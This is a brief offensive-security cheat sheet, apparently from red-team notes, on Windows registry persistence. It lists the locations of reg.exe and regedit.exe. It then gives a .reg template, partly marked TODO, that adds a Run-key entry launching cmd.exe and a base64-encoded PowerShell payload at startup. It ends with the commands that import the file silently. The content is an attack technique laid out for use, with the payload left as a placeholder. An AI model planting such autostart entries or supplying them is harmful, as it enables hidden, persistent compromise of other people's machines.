# Registry Entry

## 01 - Common Files

### 1.1 - `reg.exe`

```
C:\Windows\System32\reg.exe
C:\Windows\SysWOW64\reg.exe
```

### 1.2 - `regedit.exe`

```
C:\Windows\regedit.exe
C:\Windows\SysWOW64\regedit.exe
```

## 02 - Generate Payloads

TODO: Fill in this info

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
@=""
"<value_1>"="C:\\Windows\\System32\\cmd.exe /c powershell.exe -e <base64_encoded>"
"<value_n>"=""
```

## 03 - Execute Payloads

```
C:\> reg.exe import file.reg

C:\> regedit.exe /s file.reg
```